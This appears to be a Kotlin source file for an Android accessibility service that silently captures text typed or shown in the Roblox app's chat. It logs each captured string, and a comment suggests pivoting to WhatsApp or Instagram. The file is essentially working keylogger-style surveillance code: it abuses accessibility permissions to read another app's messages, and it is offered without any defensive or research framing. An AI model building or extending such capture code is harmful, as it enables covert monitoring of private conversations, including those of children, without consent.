package com.example.accessibilitydemo
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class ChatCaptureService : AccessibilityService() {

    companion object {
        private const val TAG = "RobloxCapture"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Service Started Successfully")
    }
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // 1. Check if the event is from Roblox (or WhatsApp/Instagram if you pivot)
        if (event?.packageName?.toString()?.contains("com.roblox.client") == true) {

            // 2. Only look for text changes (messages being sent/received)
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {

                // 3. Get the text!
                val text = event.text.toString()
                Log.d(TAG, "CAPTURED: $text")

                // 4. Optional: Show a toast so you know it worked
                showToast("Got: $text")
            }
        }
    }

    private fun showToast(message: String) {
        android.widget.Toast.makeText(
            applicationContext,
            message,
            android.widget.Toast.LENGTH_SHORT
        ).show()
    }

    override fun onInterrupt() {}

    // Override this to request unbinding if needed
    override fun onUnbind(intent: Intent?): Boolean {
        return super.onUnbind(intent)
    }
}
